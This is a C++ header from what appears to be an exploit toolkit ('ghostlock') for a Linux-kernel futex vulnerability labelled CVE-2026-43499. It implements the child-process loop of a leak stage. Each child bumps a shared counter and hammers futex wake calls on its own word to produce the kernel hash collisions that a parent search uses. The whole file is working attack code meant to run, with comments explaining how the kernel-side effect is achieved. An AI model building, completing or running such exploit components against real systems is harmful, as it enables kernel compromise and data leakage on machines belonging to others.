#pragma once
/** @file backend/cve_2026_43499/leak/snitch_child.hpp
 *  What one member of the cohort does: poke its word, and keep poking.
 *
 *  The collision the search relies on is produced by the kernel hashing a futex address
 *  together with the task it belongs to, so a child that never touches its word produces
 *  nothing to collide. One poke is therefore two things together: a count in the shared
 *  region, so the parent knows how far the cohort has got, and a futex operation on the
 *  word itself, which is the part the kernel sees. Doing only the first would look right
 *  from the parent and produce nothing from the kernel.
 *
 *  The child runs until it is stopped: the retired tree killed its children, and the
 *  protocol above does the same. The stop word exists so a child that is asked to leave
 *  can, rather than being killed mid-operation -- a child that dies holding a lock is the
 *  kind of thing that turns a search into a hang.
 */
#include <cstddef>
#include <cstdint>

#include "backend/cve_2026_43499/leak/snitch_ops.hpp"

namespace ghostlock::backend::cve_2026_43499::leak {
    /** What one child is given: where to poke, where to count, and how much at a time. */
    struct ChildArgs final {
        /** The word this child hammers. */
        std::uint32_t *word = nullptr;
        /** The counter in the shared region, which the parent watches. */
        std::uint32_t *counter = nullptr;
        /** Set to non-zero when the child should stop. */
        std::uint32_t *stop = nullptr;
        /** How many futex operations one poke is worth. */
        std::uint32_t amount = 1U;
    };

    /** One poke: the count goes up and the word is touched, in that order. Returns false
     *  when the child has no word to touch, which is a caller mistake and not a poke. */
    template <SnitchOps Seam>
    [[nodiscard]] bool poke_once(const ChildArgs &args) noexcept {
        if (args.word == nullptr || args.counter == nullptr) {
            return false;
        }
        *args.counter += args.amount;
        /* The futex operation is the point of the poke: the count alone produces nothing
         *  for the kernel to hash. A wait that would block is not wanted here, so the word
         *  is left changed and the wake is what the call turns into. */
        *args.word += 1U;
        (void) Seam::futex_wake_private(args.word, 1);
        return true;
    }

    /** The child's whole job: keep poking until the stop word is set. */
    template <SnitchOps Seam>
    void child_main(const ChildArgs &args) noexcept {
        while (args.stop != nullptr && *args.stop == 0U) {
            if (!poke_once<Seam>(args)) {
                return;
            }
        }
    }
}  // namespace ghostlock::backend::cve_2026_43499::leak
